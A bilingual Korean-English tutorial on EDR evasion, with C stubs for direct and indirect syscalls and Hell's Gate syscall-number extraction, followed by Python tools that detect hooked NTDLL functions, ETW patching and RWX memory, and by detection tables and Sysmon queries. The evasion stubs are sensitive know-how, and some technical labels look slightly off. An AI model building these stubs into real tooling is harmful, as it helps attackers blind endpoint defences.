> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# EDR 우회 — API 후킹 우회·메모리 주입·탐지 분석

## 0. 초보자를 위한 개념 이해

### API 후킹(Hooking)이란?

**API 후킹**은 EDR이 Windows API 함수 호출을 가로채어 분석하는 기법입니다.

```
정상 프로그램의 API 호출:
  내 코드 → CreateProcess() 호출 → Windows API 실행

EDR의 API 후킹:
  내 코드 → CreateProcess() 호출
            → EDR이 가로챔 (후크)
            → EDR 분석: 악성인가?
            → 안전하면 실제 API 실행
            → 위험하면 차단
```

**비유:** 우체국에서 모든 편지를 X-ray로 검사하는 것처럼, EDR이 모든 API 호출을 검사합니다.

### Windows 호출 스택 이해

```
사용자 코드
    ↓
Win32 API (kernel32.dll)         ← 고수준 API
    ↓
Native API (ntdll.dll)           ← 저수준 API ← EDR이 여기 주로 후킹
    ↓
System Call (syscall)            ← 커널 진입점
    ↓
Windows 커널 (ntoskrnl.exe)
    ↓
하드웨어

EDR 후킹 위치:
  ntdll.dll에 주요 함수 후킹:
  - NtAllocateVirtualMemory: 메모리 할당
  - NtWriteVirtualMemory: 다른 프로세스에 쓰기
  - NtCreateThread: 새 스레드 생성
  → 이 API들로 악성코드 주입 패턴 탐지
```

### 왜 이것을 배우는가?

```
보안 연구 관점:
  EDR의 동작 원리를 이해해야 → 방어 전략 개선 가능
  "공격자가 어떻게 우회하는지 알아야 막을 수 있다"

레드팀 관점:
  실제 APT 공격자들이 사용하는 기법으로 테스트
  → 방어팀의 EDR 탐지 능력 평가
  
CTF:
  "Heap exploitation with EDR bypass" 문제 유형에 필요
```

> ⚠️ 허가된 보안 평가, CTF, 보안 연구 목적으로만 사용하세요.

---

## 1. EDR 동작 원리

```
사용자 모드 애플리케이션
    │
    ├── EDR 후킹된 Win32 API (kernel32.dll)
    │       ↓ 인터셉트 → EDR 분석
    ├── NTDLL (Native API) — 시스템 콜 직전
    │       ↓ 인터셉트 → EDR 분석
    └── 시스템 콜 (syscall) — 커널 모드 진입
            │
            ▼
    커널 모드 드라이버 (EDR 미니필터)
            │
            ▼
    Windows Kernel
```

EDR은 주로 NTDLL 함수에 후크를 설치해 `NtCreateProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory` 등을 모니터링한다.

---

## 2. 직접 시스템 콜 (Direct Syscall)

```c
// EDR이 후킹한 NTDLL을 우회해 직접 syscall 실행
// Syscall 번호는 Windows 버전마다 다름 (동적으로 추출 필요)

#include <windows.h>

// NtAllocateVirtualMemory syscall stub
// Windows 10 2004: syscall number 0x18
__declspec(naked) NTSTATUS NtAllocateVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    __asm {
        mov eax, 0x18  // syscall 번호 (버전별 상이)
        syscall
        ret
    }
}

// Hells Gate — NTDLL에서 동적으로 syscall 번호 추출
DWORD get_syscall_number(const char* function_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID func = GetProcAddress(ntdll, function_name);

    // 후킹 여부 확인: 첫 바이트가 0xE9(JMP)이면 후킹됨
    BYTE* bytes = (BYTE*)func;
    if (bytes[0] == 0xE9) {
        // 후킹된 경우 — Tartarus Gate: 다음 함수에서 번호 추출
        // 또는 Heaven's Gate: 디스크의 ntdll.dll 읽기
        return 0;
    }

    // 정상: mov eax, imm32 패턴에서 syscall 번호 추출
    // 0B8h, <syscall_num_4bytes>
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
        bytes[3] == 0xB8) {
        return *(DWORD*)(bytes + 4);
    }

    return 0;
}
```

---

## 3. 간접 시스템 콜 (Indirect Syscall)

```c
// NTDLL의 syscall 명령어 주소를 찾아 직접 점프
// EDR의 반환 주소 검사 우회

PVOID find_syscall_instruction(const char* function_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID func = GetProcAddress(ntdll, function_name);
    BYTE* bytes = (BYTE*)func;

    // syscall 명령어 (0F 05) 탐색
    for (int i = 0; i < 32; i++) {
        if (bytes[i] == 0x0F && bytes[i+1] == 0x05) {
            return (PVOID)(bytes + i);
        }
    }
    return NULL;
}

// 어셈블리로 간접 syscall
// rcx, rdx, r8, r9: 파라미터
// rax: syscall 번호
// r11: syscall 명령어 주소로 점프
__declspec(naked) NTSTATUS indirect_syscall(
    DWORD syscall_num,
    PVOID syscall_addr,
    ...
) {
    __asm {
        mov rax, rcx        // syscall 번호
        mov r11, rdx        // syscall 명령어 주소
        mov rcx, r8         // 원래 첫 번째 파라미터
        jmp r11             // syscall 명령어로 점프
    }
}
```

---

## 4. 디스크 NTDLL 재로드 (Heaven's Gate)

```python
#!/usr/bin/env python3
"""EDR 후킹 우회 기법 분석 도구 — 후킹된 NTDLL 함수 탐지."""

import argparse
import ctypes
import os
import struct
from pathlib import Path

# Windows API (ctypes)
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40


def find_hooked_functions(ntdll_path: str = r"C:\Windows\System32\ntdll.dll") -> list[dict]:
    """메모리 NTDLL과 디스크 NTDLL 비교 — 후킹된 함수 탐지."""
    import pefile  # pip install pefile

    hooked: list[dict] = []

    if os.name != "nt":
        print("Windows 전용 기능")
        return hooked

    # 디스크에서 ntdll.dll 로드
    try:
        disk_ntdll = pefile.PE(ntdll_path)
    except Exception as e:
        print(f"ntdll.dll 로드 실패: {e}")
        return hooked

    # 메모리의 ntdll.dll
    kernel32 = ctypes.windll.kernel32
    mem_ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")

    # 내보내기 테이블에서 Nt* 함수 확인
    if hasattr(disk_ntdll, "DIRECTORY_ENTRY_EXPORT"):
        for exp in disk_ntdll.DIRECTORY_ENTRY_EXPORT.symbols:
            if not exp.name:
                continue
            name = exp.name.decode()
            if not name.startswith("Nt"):
                continue

            # 디스크 함수 첫 20바이트
            rva = exp.address
            disk_bytes = disk_ntdll.get_data(rva, 20)

            # 메모리 함수 첫 20바이트
            mem_addr = mem_ntdll_base + rva
            mem_bytes = (ctypes.c_char * 20).from_address(mem_addr).raw

            if disk_bytes != mem_bytes:
                # 첫 바이트가 JMP(0xE9)이면 인라인 후크
                hook_type = "INLINE_JMP" if mem_bytes[0:1] == b"\xe9" else "MODIFIED"
                hooked.append({
                    "function": name,
                    "hook_type": hook_type,
                    "disk_bytes": disk_bytes[:8].hex(),
                    "mem_bytes": mem_bytes[:8].hex(),
                })

    return hooked


def check_etw_patching() -> bool:
    """ETW (Event Tracing for Windows) 패칭 여부 탐지."""
    if os.name != "nt":
        return False

    ntdll = ctypes.windll.ntdll
    # EtwEventWrite 함수 첫 바이트 확인
    func_addr = ctypes.windll.kernel32.GetProcAddress(
        ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
        b"EtwEventWrite",
    )
    if not func_addr:
        return False

    first_byte = ctypes.c_byte.from_address(func_addr).value
    return first_byte == 0xC3  # ret 명령어 → ETW 비활성화됨


def main() -> None:
    parser = argparse.ArgumentParser(description="EDR 후킹 탐지 (Windows 전용)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    hooks_p = sub.add_parser("hooks", help="후킹된 NTDLL 함수 탐지")
    hooks_p.add_argument("--ntdll", default=r"C:\Windows\System32\ntdll.dll")

    etw_p = sub.add_parser("etw", help="ETW 패칭 탐지")

    args = parser.parse_args()

    match args.cmd:
        case "hooks":
            print("[*] NTDLL 함수 후킹 탐지 중...")
            hooked = find_hooked_functions(args.ntdll)
            if hooked:
                print(f"\n[!] 후킹된 함수 {len(hooked)}개 발견:")
                for h in hooked:
                    print(f"  [{h['hook_type']}] {h['function']}")
                    print(f"    디스크: {h['disk_bytes']} | 메모리: {h['mem_bytes']}")
            else:
                print("[+] 후킹 탐지 없음")

        case "etw":
            patched = check_etw_patching()
            print(f"[!] ETW 패칭됨 (탐지 우회)" if patched else "[+] ETW 정상")


if __name__ == "__main__":
    main()
```

---

## 5. 메모리 인젝션 탐지

```python
#!/usr/bin/env python3
"""프로세스 메모리 이상 탐지 — 실행 가능 메모리 스캔."""

import argparse
import ctypes
import struct
import sys
from dataclasses import dataclass
from pathlib import Path


if sys.platform == "win32":
    PROCESS_VM_READ = 0x0010
    PROCESS_QUERY_INFORMATION = 0x0400
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE = 0x10
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_EXECUTE_WRITECOPY = 0x80

    EXECUTABLE_PAGES = {PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY}

    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("BaseAddress", ctypes.c_size_t),
            ("AllocationBase", ctypes.c_size_t),
            ("AllocationProtect", ctypes.c_uint32),
            ("RegionSize", ctypes.c_size_t),
            ("State", ctypes.c_uint32),
            ("Protect", ctypes.c_uint32),
            ("Type", ctypes.c_uint32),
        ]


@dataclass
class SuspiciousRegion:
    pid: int
    base_address: int
    size: int
    protect: int
    reason: str


def scan_process_memory(pid: int) -> list[SuspiciousRegion]:
    """프로세스 메모리에서 의심스러운 실행 가능 영역 탐지."""
    if sys.platform != "win32":
        return []

    kernel32 = ctypes.windll.kernel32
    suspicious: list[SuspiciousRegion] = []

    handle = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
    if not handle:
        return suspicious

    mbi = MEMORY_BASIC_INFORMATION()
    address = 0

    while kernel32.VirtualQueryEx(handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
        if mbi.State == MEM_COMMIT and mbi.Protect in EXECUTABLE_PAGES:
            # 실행 가능 + 쓰기 가능 (RWX) — 인젝션 의심
            if mbi.Protect == PAGE_EXECUTE_READWRITE:
                suspicious.append(SuspiciousRegion(
                    pid=pid,
                    base_address=mbi.BaseAddress,
                    size=mbi.RegionSize,
                    protect=mbi.Protect,
                    reason="RWX 메모리 — 코드 인젝션 의심",
                ))

            # MEM_PRIVATE 실행 가능 영역 (PE 이미지가 아닌)
            if mbi.Type == 0x20000:  # MEM_PRIVATE
                suspicious.append(SuspiciousRegion(
                    pid=pid,
                    base_address=mbi.BaseAddress,
                    size=mbi.RegionSize,
                    protect=mbi.Protect,
                    reason="Private 실행 가능 메모리",
                ))

        address = mbi.BaseAddress + mbi.RegionSize
        if address >= 0x7FFFFFFF0000:  # 64bit 한계
            break

    kernel32.CloseHandle(handle)
    return suspicious


def main() -> None:
    parser = argparse.ArgumentParser(description="메모리 인젝션 탐지 (Windows 전용)")
    parser.add_argument("--pid", type=int, help="특정 프로세스 ID")
    parser.add_argument("--all", action="store_true", help="모든 프로세스 스캔")
    args = parser.parse_args()

    if sys.platform != "win32":
        print("Windows 전용 도구")
        return

    pids = []
    if args.pid:
        pids = [args.pid]
    elif args.all:
        import psutil
        pids = [p.pid for p in psutil.process_iter()]

    total_suspicious = []
    for pid in pids:
        regions = scan_process_memory(pid)
        total_suspicious.extend(regions)
        if regions:
            print(f"\n[!] PID {pid}: {len(regions)}개 의심 영역")
            for r in regions:
                print(f"  0x{r.base_address:016X} ({r.size // 1024}KB) — {r.reason}")

    print(f"\n총 {len(total_suspicious)}개 의심 메모리 영역")


if __name__ == "__main__":
    main()
```

---

## 6. EDR 우회 탐지 방어

| EDR 우회 기법 | 탐지 방법 | 방어 |
|-------------|-----------|------|
| 직접 syscall | syscall 호출 스택 분석 | CrowdStrike Falcon / SentinelOne 커널 콜백 |
| NTDLL 재로드 | 모듈 로드 이벤트 모니터링 | Image Load 콜백 |
| 프로세스 할로잉 | 프로세스 생성 + 언매핑 탐지 | PsSetCreateProcessNotifyRoutine |
| ETW 패칭 | ETW 제공자 상태 모니터링 | Kernel Patch Protection |
| RWX 메모리 | 메모리 권한 변경 모니터링 | VirtualProtect 콜백 |
| 간접 syscall | 반환 주소 검사 | Stack Walk Analysis |

---

<!-- detect-validate-55 -->
## 공격 탐지와 방어 검증

회피 기법은 *어떻게 탐지를 피하는가*를 다루지만, 방어자 관점에서는 **그 회피가 다른 계층의 텔레메트리에 남는가**와 **헌팅이 실제로 잡는가**를 검증해야 한다. 공격자도 이 관점으로 어떤 회피가 실효적인지 가늠할 수 있다.

### 공격 → 완화 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 완화 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| 유저랜드 언후킹 | EDR 후킹 | 커널 콜백, ETW-Ti, ELAM | ntdll .text 변경, 직접 syscall |
| 직접/간접 syscall | 유저모드 후킹 | 커널 텔레메트리, 콜스택 검사 | syscall 이 ntdll 외부에서 발생 |
| 프로세스 인젝션 | - | EDR 인젝션 탐지, Sysmon | EID 8 CreateRemoteThread, RWX 할당 |

### 방어 검증 (직접 확인)

```powershell
# 1) ntdll .text 가 디스크 이미지와 일치하는지 비교 — 불일치 = 언후킹/패치 흔적
# 2) Sysmon 이 원격 스레드 생성(인젝션)을 EID 8 로 남기는지 확인
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' |
  Where-Object { $_.Id -eq 8 } | Select-Object -First 10
# 3) 커널 ETW-Ti 텔레메트리가 유저모드 후킹 우회를 보완하는지 확인
```

> 검증은 반드시 **소유한 시스템·통제된 환경**에서만 수행한다. 완화를 "설정했다"와 "런타임에 실제 막힌다"는 다르다 — PoC 를 재현해 완화가 차단하는지 확인해야 신뢰할 수 있다([[68_Purple_Team]]).

**최신 기법·통제 (2025–2026):**
- 콜스택 스푸핑·하드웨어 브레이크포인트(VEH) 후킹으로 유저모드 콜스택을 위조 — 커널 ETW-Ti·스택워크 무결성 검사로 보완하며, 유저모드 후킹 단독 의존은 이미 취약
- Sysmon EID 25(ProcessTampering)로 프로세스 할로잉/헤르파덜핑을 포착: `Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | ? {$_.Id -eq 25}`

---


<a name="english"></a>

# EDR Bypass — API Hook Bypass, Memory Injection, Detection Analysis

## 1. How EDR Works

```
User Mode Application
    │
    ├── EDR-hooked Win32 API (kernel32.dll)
    │       ↓ intercept → EDR analysis
    ├── NTDLL (Native API) — just before syscall
    │       ↓ intercept → EDR analysis
    └── Syscall — entering kernel mode
            │
            ▼
    Kernel Mode Driver (EDR minifilter)
            │
            ▼
    Windows Kernel
```

EDR primarily installs hooks on NTDLL functions to monitor `NtCreateProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, etc.

---

## 2. Direct Syscall

```c
// Execute syscall directly, bypassing EDR-hooked NTDLL
// Syscall numbers differ per Windows version (must be extracted dynamically)

#include <windows.h>

// NtAllocateVirtualMemory syscall stub
// Windows 10 2004: syscall number 0x18
__declspec(naked) NTSTATUS NtAllocateVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    __asm {
        mov eax, 0x18  // syscall number (varies by version)
        syscall
        ret
    }
}

// Hells Gate — dynamically extract syscall number from NTDLL
DWORD get_syscall_number(const char* function_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID func = GetProcAddress(ntdll, function_name);

    // Check if hooked: first byte 0xE9 (JMP) means hooked
    BYTE* bytes = (BYTE*)func;
    if (bytes[0] == 0xE9) {
        // Hooked — Tartarus Gate: extract number from next function
        // Or Heaven's Gate: read ntdll.dll from disk
        return 0;
    }

    // Normal: extract syscall number from mov eax, imm32 pattern
    // 0B8h, <syscall_num_4bytes>
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
        bytes[3] == 0xB8) {
        return *(DWORD*)(bytes + 4);
    }

    return 0;
}
```

---

## 3. Indirect Syscall

```c
// Find syscall instruction address in NTDLL and jump directly
// Bypass EDR return address inspection

PVOID find_syscall_instruction(const char* function_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID func = GetProcAddress(ntdll, function_name);
    BYTE* bytes = (BYTE*)func;

    // Search for syscall instruction (0F 05)
    for (int i = 0; i < 32; i++) {
        if (bytes[i] == 0x0F && bytes[i+1] == 0x05) {
            return (PVOID)(bytes + i);
        }
    }
    return NULL;
}

// Indirect syscall via assembly
// rcx, rdx, r8, r9: parameters
// rax: syscall number
// r11: jump to syscall instruction address
__declspec(naked) NTSTATUS indirect_syscall(
    DWORD syscall_num,
    PVOID syscall_addr,
    ...
) {
    __asm {
        mov rax, rcx        // syscall number
        mov r11, rdx        // syscall instruction address
        mov rcx, r8         // original first parameter
        jmp r11             // jump to syscall instruction
    }
}
```

---

## 4. Reload NTDLL from Disk (Heaven's Gate)

```python
#!/usr/bin/env python3
"""EDR hook bypass technique analysis tool — detect hooked NTDLL functions."""

import argparse
import ctypes
import os
import struct
from pathlib import Path

# Windows API (ctypes)
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40


def find_hooked_functions(ntdll_path: str = r"C:\Windows\System32\ntdll.dll") -> list[dict]:
    """Compare in-memory NTDLL with on-disk NTDLL — detect hooked functions."""
    import pefile  # pip install pefile

    hooked: list[dict] = []

    if os.name != "nt":
        print("Windows-only feature")
        return hooked

    # Load ntdll.dll from disk
    try:
        disk_ntdll = pefile.PE(ntdll_path)
    except Exception as e:
        print(f"Failed to load ntdll.dll: {e}")
        return hooked

    # In-memory ntdll.dll
    kernel32 = ctypes.windll.kernel32
    mem_ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")

    # Check Nt* functions in export table
    if hasattr(disk_ntdll, "DIRECTORY_ENTRY_EXPORT"):
        for exp in disk_ntdll.DIRECTORY_ENTRY_EXPORT.symbols:
            if not exp.name:
                continue
            name = exp.name.decode()
            if not name.startswith("Nt"):
                continue

            # First 20 bytes of disk function
            rva = exp.address
            disk_bytes = disk_ntdll.get_data(rva, 20)

            # First 20 bytes of in-memory function
            mem_addr = mem_ntdll_base + rva
            mem_bytes = (ctypes.c_char * 20).from_address(mem_addr).raw

            if disk_bytes != mem_bytes:
                # If first byte is JMP (0xE9), it's an inline hook
                hook_type = "INLINE_JMP" if mem_bytes[0:1] == b"\xe9" else "MODIFIED"
                hooked.append({
                    "function": name,
                    "hook_type": hook_type,
                    "disk_bytes": disk_bytes[:8].hex(),
                    "mem_bytes": mem_bytes[:8].hex(),
                })

    return hooked


def check_etw_patching() -> bool:
    """Detect if ETW (Event Tracing for Windows) has been patched."""
    if os.name != "nt":
        return False

    ntdll = ctypes.windll.ntdll
    # Check first byte of EtwEventWrite function
    func_addr = ctypes.windll.kernel32.GetProcAddress(
        ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
        b"EtwEventWrite",
    )
    if not func_addr:
        return False

    first_byte = ctypes.c_byte.from_address(func_addr).value
    return first_byte == 0xC3  # ret instruction → ETW disabled


def main() -> None:
    parser = argparse.ArgumentParser(description="EDR hook detection (Windows only)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    hooks_p = sub.add_parser("hooks", help="Detect hooked NTDLL functions")
    hooks_p.add_argument("--ntdll", default=r"C:\Windows\System32\ntdll.dll")

    etw_p = sub.add_parser("etw", help="Detect ETW patching")

    args = parser.parse_args()

    match args.cmd:
        case "hooks":
            print("[*] Detecting NTDLL function hooks...")
            hooked = find_hooked_functions(args.ntdll)
            if hooked:
                print(f"\n[!] Found {len(hooked)} hooked functions:")
                for h in hooked:
                    print(f"  [{h['hook_type']}] {h['function']}")
                    print(f"    Disk: {h['disk_bytes']} | Memory: {h['mem_bytes']}")
            else:
                print("[+] No hooks detected")

        case "etw":
            patched = check_etw_patching()
            print(f"[!] ETW is patched (detection bypassed)" if patched else "[+] ETW is normal")


if __name__ == "__main__":
    main()
```

---

## 5. Memory Injection Detection

```python
#!/usr/bin/env python3
"""Process memory anomaly detection — scan for executable memory regions."""

import argparse
import ctypes
import struct
import sys
from dataclasses import dataclass
from pathlib import Path


if sys.platform == "win32":
    PROCESS_VM_READ = 0x0010
    PROCESS_QUERY_INFORMATION = 0x0400
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE = 0x10
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_EXECUTE_WRITECOPY = 0x80

    EXECUTABLE_PAGES = {PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY}

    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("BaseAddress", ctypes.c_size_t),
            ("AllocationBase", ctypes.c_size_t),
            ("AllocationProtect", ctypes.c_uint32),
            ("RegionSize", ctypes.c_size_t),
            ("State", ctypes.c_uint32),
            ("Protect", ctypes.c_uint32),
            ("Type", ctypes.c_uint32),
        ]


@dataclass
class SuspiciousRegion:
    pid: int
    base_address: int
    size: int
    protect: int
    reason: str


def scan_process_memory(pid: int) -> list[SuspiciousRegion]:
    """Detect suspicious executable regions in process memory."""
    if sys.platform != "win32":
        return []

    kernel32 = ctypes.windll.kernel32
    suspicious: list[SuspiciousRegion] = []

    handle = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
    if not handle:
        return suspicious

    mbi = MEMORY_BASIC_INFORMATION()
    address = 0

    while kernel32.VirtualQueryEx(handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
        if mbi.State == MEM_COMMIT and mbi.Protect in EXECUTABLE_PAGES:
            # Executable + writable (RWX) — suspected injection
            if mbi.Protect == PAGE_EXECUTE_READWRITE:
                suspicious.append(SuspiciousRegion(
                    pid=pid,
                    base_address=mbi.BaseAddress,
                    size=mbi.RegionSize,
                    protect=mbi.Protect,
                    reason="RWX memory — suspected code injection",
                ))

            # MEM_PRIVATE executable region (not a PE image)
            if mbi.Type == 0x20000:  # MEM_PRIVATE
                suspicious.append(SuspiciousRegion(
                    pid=pid,
                    base_address=mbi.BaseAddress,
                    size=mbi.RegionSize,
                    protect=mbi.Protect,
                    reason="Private executable memory",
                ))

        address = mbi.BaseAddress + mbi.RegionSize
        if address >= 0x7FFFFFFF0000:  # 64-bit limit
            break

    kernel32.CloseHandle(handle)
    return suspicious


def main() -> None:
    parser = argparse.ArgumentParser(description="Memory injection detection (Windows only)")
    parser.add_argument("--pid", type=int, help="Specific process ID")
    parser.add_argument("--all", action="store_true", help="Scan all processes")
    args = parser.parse_args()

    if sys.platform != "win32":
        print("Windows-only tool")
        return

    pids = []
    if args.pid:
        pids = [args.pid]
    elif args.all:
        import psutil
        pids = [p.pid for p in psutil.process_iter()]

    total_suspicious = []
    for pid in pids:
        regions = scan_process_memory(pid)
        total_suspicious.extend(regions)
        if regions:
            print(f"\n[!] PID {pid}: {len(regions)} suspicious regions")
            for r in regions:
                print(f"  0x{r.base_address:016X} ({r.size // 1024}KB) — {r.reason}")

    print(f"\nTotal {len(total_suspicious)} suspicious memory regions")


if __name__ == "__main__":
    main()
```

---

## 6. EDR Bypass Detection Defense

| EDR Bypass Technique  | Detection Method                           | Defense                                      |
|-----------------------|--------------------------------------------|----------------------------------------------|
| Direct syscall        | Analyze syscall call stack                 | CrowdStrike Falcon / SentinelOne kernel callbacks |
| NTDLL reload          | Monitor module load events                 | Image Load callback                          |
| Process hollowing     | Detect process creation + unmapping        | PsSetCreateProcessNotifyRoutine              |
| ETW patching          | Monitor ETW provider status                | Kernel Patch Protection                      |
| RWX memory            | Monitor memory permission changes          | VirtualProtect callback                      |
| Indirect syscall      | Inspect return address                     | Stack Walk Analysis                          |

---

## Attack Detection and Defense Validation

Evasion covers *how* you avoid detection, but from the defender's side you must verify **whether the evasion surfaces in another layer's telemetry** and **whether hunting actually catches it**. Attackers can use this lens too, to judge which evasions are real.

### Attack -> mitigation layer -> control (defender) -> detection signal

| Technique | Targeted mitigation | Primary control (prevention) | Detection signal |
|---|---|---|---|
| Userland unhooking | EDR hooks | Kernel callbacks, ETW-Ti, ELAM | ntdll .text modified, direct syscalls |
| Direct/indirect syscalls | User-mode hooks | Kernel telemetry, call-stack inspection | syscall originating outside ntdll |
| Process injection | - | EDR injection detection, Sysmon | EID 8 CreateRemoteThread, RWX allocation |

### Defense validation (verify yourself)

```powershell
# 1) Compare ntdll .text against the on-disk image -- a mismatch = unhook/patch trace
# 2) Confirm Sysmon logs remote-thread creation (injection) as EID 8
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' |
  Where-Object { $_.Id -eq 8 } | Select-Object -First 10
# 3) Confirm kernel ETW-Ti telemetry complements user-mode hook evasion
```

> Run validation only on **systems you own, in a controlled environment**. "Configured" is not the same as "blocked at runtime" -- reproduce the PoC and confirm the mitigation stops it (see [[68_Purple_Team]]).
